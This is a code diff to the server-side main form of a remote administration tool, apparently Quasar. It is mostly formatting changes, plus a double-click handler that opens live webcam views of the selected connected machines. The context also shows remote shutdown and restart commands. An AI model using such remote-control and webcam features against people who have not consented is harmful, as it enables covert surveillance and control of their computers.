@@ -63,7 +63,7 @@ namespace Quasar.Server.Forms
             _titleUpdateRunning = true;
             try
             {
-                this.Invoke((MethodInvoker) delegate
+                this.Invoke((MethodInvoker)delegate
                 {
                     int selected = lstClients.SelectedItems.Count;
                     this.Text = (selected > 0)
@@ -172,7 +172,7 @@ namespace Quasar.Server.Forms
         {
             try
             {
-                this.Invoke((MethodInvoker) delegate
+                this.Invoke((MethodInvoker)delegate
                 {
                     if (!listening)
                         lstClients.Items.Clear();
@@ -273,7 +273,7 @@ namespace Quasar.Server.Forms
 
             try
             {
-                lstClients.Invoke((MethodInvoker) delegate
+                lstClients.Invoke((MethodInvoker)delegate
                 {
                     var item = GetListViewItemByClient(client);
                     if (item != null)
@@ -301,9 +301,10 @@ namespace Quasar.Server.Forms
                     " " + client.EndPoint.Address, client.Value.Tag,
                     client.Value.UserAtPc, client.Value.Version, "Connected", "Active", client.Value.CountryWithCode,
                     client.Value.OperatingSystem, client.Value.AccountType
-                }) { Tag = client, ImageIndex = client.Value.ImageIndex };
+                })
+                { Tag = client, ImageIndex = client.Value.ImageIndex };
 
-                lstClients.Invoke((MethodInvoker) delegate
+                lstClients.Invoke((MethodInvoker)delegate
                 {
                     lock (_lockClients)
                     {
@@ -328,7 +329,7 @@ namespace Quasar.Server.Forms
 
             try
             {
-                lstClients.Invoke((MethodInvoker) delegate
+                lstClients.Invoke((MethodInvoker)delegate
                 {
                     lock (_lockClients)
                     {
@@ -385,7 +386,7 @@ namespace Quasar.Server.Forms
 
             ListViewItem itemClient = null;
 
-            lstClients.Invoke((MethodInvoker) delegate
+            lstClients.Invoke((MethodInvoker)delegate
             {
                 itemClient = lstClients.Items.Cast<ListViewItem>()
                     .FirstOrDefault(lvi => lvi != null && client.Equals(lvi.Tag));
@@ -437,7 +438,7 @@ namespace Quasar.Server.Forms
                 this.Invoke((MethodInvoker)delegate
                 {
                     if (c == null || c.Value == null) return;
-                    
+
                     notifyIcon.ShowBalloonTip(4000, string.Format("Client connected from {0}!", c.Value.Country),
                         string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address.ToString(),
                         c.Value.OperatingSystem), ToolTipIcon.Info);
@@ -614,7 +615,7 @@ namespace Quasar.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                c.Send(new DoShutdownAction {Action = ShutdownAction.Shutdown});
+                c.Send(new DoShutdownAction { Action = ShutdownAction.Shutdown });
             }
         }
 
@@ -622,7 +623,7 @@ namespace Quasar.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                c.Send(new DoShutdownAction {Action = ShutdownAction.Restart});
+                c.Send(new DoShutdownAction { Action = ShutdownAction.Restart });
             }
         }
 
@@ -630,7 +631,7 @@ namespace Quasar.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                c.Send(new DoShutdownAction {Action = ShutdownAction.Standby});
+                c.Send(new DoShutdownAction { Action = ShutdownAction.Standby });
             }
         }
 
@@ -776,12 +777,22 @@ namespace Quasar.Server.Forms
 
         private void remoteWebcamToolStripMenuItem_Click(object sender, EventArgs e)
         {
+            GetWebcams();
+        }
+
+        void GetWebcams()
+        {
             foreach (Client c in GetSelectedClients())
             {
                 FrmRemoteWebcam frmRw = FrmRemoteWebcam.CreateNewOrGetExisting(c);
                 frmRw.Show();
                 frmRw.Focus();
             }
+        }
+
+        private void lstClients_DoubleClick(object sender, EventArgs e)
+        {
+            GetWebcams();
         }
     }
 }
